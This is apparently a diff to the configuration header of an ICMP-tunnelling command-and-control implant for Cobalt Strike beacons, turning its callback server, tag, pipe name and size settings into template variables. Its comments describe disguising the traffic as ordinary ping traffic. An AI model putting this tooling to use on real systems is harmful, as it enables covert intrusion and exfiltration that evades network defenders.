@@ -19,8 +19,7 @@ NOTE - if you set this to something longer than a second, and have a small paylo
 to download the initial payload
 
 */
-#define TEST {{ test }}
-#define SLEEP_TIME 1000 
+#define SLEEP_TIME {{ sleep_time }}
 
 /*
 adjust this to set the max payload size per icmp request.
@@ -39,13 +38,13 @@ would look like fairly normal traffic patterns from windows if you did "ping goo
 Max is 1472, which is the the MTU of 1500 - 20 for IPV4, and 8 for ICMP header
 
 */
-#define ICMP_PAYLOAD_SIZE 1000  // in bytes, MUST MATCH VALUE OF `ICMP_PAYLOAD_SIZE` in controller.py
+#define ICMP_PAYLOAD_SIZE {{ icmp_payload_size }}  // in bytes, MUST MATCH VALUE OF `ICMP_PAYLOAD_SIZE` in controller.py
 
 
 //Callback server that the Controller is listenening on
-#define ICMP_CALLBACK_SERVER "172.19.241.197"
+#define ICMP_CALLBACK_SERVER "{{ icmp_callback_server }}"
 //4 Byte tag that is icnluded in each payload. Change to whatever you want, as long as it's 4 bytes
-#define ICMP_TAG "RQ47"
+#define ICMP_TAG "{{ icmp_tag }}"
 
 /*
 Named Pipe to connect your beacon to
@@ -56,7 +55,7 @@ ex:
     pipename="mypipe" -> `#define PIPENAME "\\\\.\\pipe\\mypipe"`
 
 */
-#define PIPENAME "\\\\.\\pipe\\foobar"
+#define PIPENAME "{{ pipename }}"
 
 ///////////////////////////////////////////////////////////////////////
 
@@ -69,8 +68,8 @@ ex:
 #define TAG_SIZE       4  //tag size
 #define MAX_PACKET_SIZE (IPV4_HEADER + ICMP_HEADER + ICMP_PAYLOAD_SIZE)
 //Cobalt Strike Settings
-#define PAYLOAD_MAX_SIZE (512 * 1024)
-#define BUFFER_MAX_SIZE (1024 * 1024) * 10 //10mb
+#define PAYLOAD_MAX_SIZE {{ payload_max_size}} //(512 * 1024)
+#define BUFFER_MAX_SIZE  {{ buffer_max_size }} //(1024 * 1024) * 10 //10mb
 ///////////////////////////////////////////////////////////////////////
 //Ohkay actual code stuff now:
 
